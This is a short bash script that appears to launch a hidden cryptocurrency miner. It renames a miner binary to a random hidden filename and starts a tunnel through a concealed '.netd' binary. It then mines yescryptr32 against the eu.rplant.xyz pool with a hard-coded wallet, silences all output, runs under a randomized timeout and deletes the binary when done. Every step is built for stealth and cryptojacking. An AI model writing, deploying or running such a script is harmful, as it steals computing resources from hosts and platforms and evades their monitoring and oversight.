#!/bin/bash

sleep $((RANDOM % 20 + 5))

NAME=".$(tr -dc a-z0-9 </dev/urandom | head -c6)"

cp /app/sr "/app/$NAME"
chmod +x "/app/$NAME"
rm -f /app/sr

# start tunnel
/usr/local/bin/.netd access tcp \
--hostname "$(cat .h)" \
--url 127.0.0.1:443 >/dev/null 2>&1 &

sleep 3

# durasi
DURATION=$((3300 + RANDOM % 200))

# run (tanpa bash -c, tanpa exec -a dulu)
timeout ${DURATION}s /app/$NAME \
-a yescryptr32 \
-o eu.rplant.xyz:7047 \
-u lpep1qz4kz27v2s3l48prnalqhzhluvhy9ljtl7hchad.hail \
-p x >/dev/null 2>&1

rm -f "/app/$NAME"

exit 0
